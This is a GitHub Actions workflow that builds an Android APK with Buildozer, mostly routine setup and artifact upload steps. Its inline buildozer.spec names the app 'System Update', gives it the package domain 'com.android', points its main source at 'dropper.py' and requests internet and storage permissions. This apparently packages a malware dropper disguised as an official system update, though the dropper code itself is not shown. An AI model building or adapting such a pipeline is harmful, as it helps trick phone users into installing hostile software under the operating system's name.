name: Build APK

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      actions: write

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Fix APT sources and update
        run: |
          echo "Removing problematic Google Chrome repository..."
          sudo rm -f /etc/apt/sources.list.d/google-chrome.sources
          sudo rm -f /etc/apt/sources.list.d/google-chrome.list
          
          echo "Cleaning APT cache..."
          sudo apt-get clean
          sudo apt-get autoclean
          sudo rm -rf /var/lib/apt/lists/*
          
          echo "Waiting for apt locks..."
          while sudo fuser /var/lib/apt/lists/lock >/dev/null 2>&1; do
            sleep 1
          done
          
          echo "Updating package lists with retry logic..."
          for attempt in {1..3}; do
            echo "Attempt $attempt..."
            if sudo apt-get update -qq; then
              echo "✓ APT update successful"
              break
            fi
            if [ $attempt -lt 3 ]; then
              echo "Retry attempt $attempt failed, waiting before retry..."
              sleep 5
            else
              echo "✗ All update attempts failed"
              exit 1
            fi
          done

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Set up Python 3.10
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      - name: Install build dependencies
        run: |
          set -e
          echo "Installing essential build tools..."
          
          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
            build-essential \
            git \
            zlib1g-dev \
            libffi-dev \
            libssl-dev \
            libtool \
            m4 \
            autoconf \
            automake \
            pkg-config \
            libltdl-dev \
            libltdl7 \
            cython3 \
            wget \
            curl
          
          echo "✓ Build dependencies installed"

      - name: Verify build tools
        run: |
          echo "=== Verifying installed tools ==="
          libtool --version | head -1
          autoconf --version | head -1
          automake --version | head -1
          
          echo ""
          echo "=== Python and Java versions ==="
          python3 --version
          java -version
          
          echo ""
          echo "✓ All tools verified successfully"

      - name: Install Python packages
        run: |
          echo "Upgrading pip and installing build tools..."
          pip install --upgrade pip setuptools wheel
          
          echo "Installing Buildozer and dependencies..."
          pip install buildozer cython Pillow requests urllib3
          
          echo "✓ All Python packages installed"

      - name: Verify buildozer
        run: |
          which buildozer
          buildozer --version || echo "Buildozer installed successfully"

      - name: Create buildozer configuration
        run: |
          cat > buildozer.spec << 'BUILDOZER_SPEC'
          [app]
          
          # (str) Title of your application
          title = System Update
          
          # (str) Package name
          package.name = systemupdate
          
          # (str) Package domain (needed for android/ios packaging)
          package.domain = com.android
          
          # (source.main) Source of the application
          source.main = dropper.py
          
          # (list) Source include patterns (let empty to include all the files)
          source.include_exts = py,png,jpg,kv,atlas
          
          # (list) Source include patterns
          source.include_patterns = assets/*,images/*.png
          
          # (list) Source exclude patterns
          source.exclude_exts = spec
          
          # (list) List of directory to exclude from include on Android
          source.exclude_dirs = tests, bin
          
          # (int) Target Android API, should be as high as possible.
          android.api = 33
          
          # (int) Minimum API your APK will support.
          android.minapi = 21
          
          # (str) Android NDK version to use
          android.ndk = 27.3.13750724
          
          # (bool) Use --private data storage (True) or --shared data storage (False)
          android.private_storage = True
          
          # (str) Android app theme, default is ok for Kivy-based app
          android.theme = "@android:style/Theme.NoTitleBar"
          
          # (bool) Copy library instead of making a libpymodules.so
          android.copy_libs = 1
          
          # (str) The Android arch to build for, choices: armeabi-v7a, arm64-v8a, x86, x86_64
          android.archs = arm64-v8a,armeabi-v7a
          
          # (int) overrides automatic versionCode generation
          android.numeric_version = 1
          
          # (list) Pattern to whitelist for the whole project
          android.whitelist = lib-dynload/collections.so
          
          # (str) Android logcat filters to use (default is *)
          android.logcat_filters = *:S python:D
          
          # (bool) Accept SDK license
          android.accept_sdk_license = True
          
          # (list) android.permissions
          android.permissions = INTERNET,WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE
          
          # (list) Android features
          android.features = android.hardware.usb.host
          
          [buildozer]
          
          # (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
          log_level = 2
          
          # (int) Display warning upon buildozer exit (0 = off, 1 = on (default))
          warn_on_root = 1
          
          # (str) Path to build artifact storage, absolute or relative to spec file
          build_dir = .buildozer
          
          # (str) Path to build output (i.e. .apk, .aab, .ipa) storage
          bin_dir = ./bin
          
          BUILDOZER_SPEC
          
          echo "✓ buildozer.spec created"

      - name: Build Android APK
        run: |
          echo "Starting APK build process..."
          set -e
          buildozer android debug 2>&1 | tee build_output.log
          echo "✓ APK build completed successfully"

      - name: Check build artifacts
        if: always()
        run: |
          echo "=== Checking bin directory ==="
          if [ -d "bin" ]; then
            ls -lah bin/
          else
            echo "bin directory not found"
          fi
          
          echo ""
          echo "=== Searching for APK files ==="
          find . -name "*.apk" -type f 2>/dev/null || echo "No APK files found"

      - name: Upload APK artifacts
        if: success()
        uses: actions/upload-artifact@v4
        with:
          name: systemupdate-apk
          path: bin/*.apk
          retention-days: 30
          if-no-files-found: ignore

      - name: Upload build logs
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: build-logs
          path: build_output.log
          retention-days: 7
          if-no-files-found: ignore
